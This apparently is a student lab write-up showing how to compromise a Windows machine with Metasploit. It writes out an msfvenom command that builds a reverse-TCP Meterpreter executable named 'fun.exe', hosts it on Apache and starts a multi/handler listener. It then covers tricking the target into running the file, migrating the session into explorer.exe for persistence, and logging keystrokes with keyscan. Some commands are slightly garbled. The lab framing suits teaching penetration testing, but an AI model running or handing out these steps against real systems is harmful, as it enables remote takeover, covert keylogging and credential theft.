# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig 
![image](https://github.com/user-attachments/assets/0c0271df-5fd0-409f-86f3-60f807fafb87)

Create a malicious executable file fun.exe using msenom command  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe 
![image](https://github.com/user-attachments/assets/f63246b7-05db-4d36-af7d-2a7d3acd8289)

copy the fun.exe into the apache ``/var/www/html``` folder
![image](https://github.com/user-attachments/assets/f3bc8ce8-cc95-449d-86da-8a4acebee028)

Start apache server sudo systemctl apache2 start 
![image](https://github.com/user-attachments/assets/6734da80-ead1-4c51-a226-47f4a75b911c)

Check the status of apache2 sudo apache2 status
![image](https://github.com/user-attachments/assets/7731f878-08db-419d-9f44-4037bd092037)

Invoke msfconsole:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![image](https://github.com/user-attachments/assets/fd2913ba-561d-4447-ac60-40d484a911ad)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/user-attachments/assets/11a1361f-9d37-4283-8d7e-2320481c19a0)

Bypass any warning boxes, double-click the file, and allow it to run. On kali give the command exploit
![image](https://github.com/user-attachments/assets/65ed28bd-cb21-4441-891d-a43360be8517)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name 
![image](https://github.com/user-attachments/assets/82226360-6c8b-45f1-b5ac-57fcc3f3ad7d)

keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/user-attachments/assets/792c60b8-9373-42d6-b5b4-e6d0e2889863)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
